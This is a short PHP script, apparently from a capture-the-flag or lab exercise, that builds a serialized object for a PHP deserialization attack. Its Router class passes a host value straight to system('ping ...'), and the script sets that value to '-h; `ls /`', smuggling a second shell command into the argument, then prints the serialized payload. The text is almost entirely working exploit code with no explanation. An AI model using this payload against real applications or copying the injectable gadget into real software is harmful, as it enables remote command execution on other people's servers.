<?php 
class Router
{
    public $host;

    public function __construct($host)
    {
        $this->host = $host;
    }

    public function __toString()
    {
        return system("ping " . $this->host);
    }
}

$rou = new Router("-h; `ls /`");

echo serialize($rou);

?>